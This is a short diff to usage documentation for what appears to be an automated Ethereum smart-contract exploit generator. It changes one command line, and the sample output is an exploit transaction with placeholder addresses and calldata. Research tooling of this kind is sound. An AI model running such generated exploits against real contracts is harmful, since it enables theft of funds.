@@ -60,7 +60,7 @@ $ python bin/extract_contract_code.py test.code > test.contract.code
 
 4. Generate an exploit
 ```
-$ python bin/gen_exploit.py 0x1234 0x1000 +1000
+$ python bin/gen_exploit.py test.contract.code 0x1234 0x1000 +1000
 
 ...
 eth.sendTransaction({from:"0x0000000000000000000000000000000000001234", data:"0x7cb97b2b0000000000000000000000000000000000000000000000000000000000001000", to:"0x4000000000000000000000000000000000000000", gasPrice:0})
